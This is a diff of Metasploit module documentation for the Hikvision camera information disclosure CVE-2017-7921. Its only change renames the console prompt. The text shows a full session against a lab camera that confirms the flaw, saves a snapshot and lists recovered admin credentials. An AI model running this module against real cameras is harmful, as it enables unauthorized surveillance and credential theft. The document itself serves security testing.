@@ -68,13 +68,13 @@ All information disclosed is by default stored in loot
 ### Hikvision Camera DS-2CD2142FWD-IS -> firmware version V5.4.1, build 160525
 
 ```
-msf6 auxiliary(gather/hikvision_info_disclosure_cve_2017_7921) > set rhosts 192.168.100.180
+msf auxiliary(gather/hikvision_info_disclosure_cve_2017_7921) > set rhosts 192.168.100.180
 rhosts => 192.168.100.180
-msf6 auxiliary(gather/hikvision_info_disclosure_cve_2017_7921) > set ACTION Automatic
+msf auxiliary(gather/hikvision_info_disclosure_cve_2017_7921) > set ACTION Automatic
 ACTION => Automatic
-msf6 auxiliary(gather/hikvision_info_disclosure_cve_2017_7921) > set PRINT true
+msf auxiliary(gather/hikvision_info_disclosure_cve_2017_7921) > set PRINT true
 PRINT => true
-msf6 auxiliary(gather/hikvision_info_disclosure_cve_2017_7921) > options
+msf auxiliary(gather/hikvision_info_disclosure_cve_2017_7921) > options
 
 Module options (auxiliary/gather/hikvision_info_disclosure_cve_2017_7921):
 
@@ -95,9 +95,9 @@ Auxiliary action:
    Automatic  Dump all information
 
 
-msf6 auxiliary(gather/hikvision_info_disclosure_cve_2017_7921) > check
+msf auxiliary(gather/hikvision_info_disclosure_cve_2017_7921) > check
 [+] 192.168.100.180:80 - The target is vulnerable.
-msf6 auxiliary(gather/hikvision_info_disclosure_cve_2017_7921) > run
+msf auxiliary(gather/hikvision_info_disclosure_cve_2017_7921) > run
 [*] Running module against 192.168.100.180
 
 [*] Running in automatic mode
@@ -151,7 +151,7 @@ Storage device status: HD_NORMAL
 [+] Camera snapshot is successfully saved to /root/.msf4/loot/20221002172348_default_192.168.100.180_hikvision.image_963468.bin
 [*] Auxiliary module execution completed
 
-msf6 auxiliary(gather/hikvision_info_disclosure_cve_2017_7921) > creds -O 192.168.100.180
+msf auxiliary(gather/hikvision_info_disclosure_cve_2017_7921) > creds -O 192.168.100.180
 Credentials
 ===========
 
@@ -160,7 +160,7 @@ host             origin           service        public  private   realm  privat
 192.168.100.180  192.168.100.180  80/tcp (http)  admln   asdf1234         Password
 192.168.100.180  192.168.100.180  80/tcp (http)  admin   Pa$$W0rd         Password
 
-msf6 auxiliary(gather/hikvision_info_disclosure_cve_2017_7921) >
+msf auxiliary(gather/hikvision_info_disclosure_cve_2017_7921) >
 ```
 
 ## Limitations
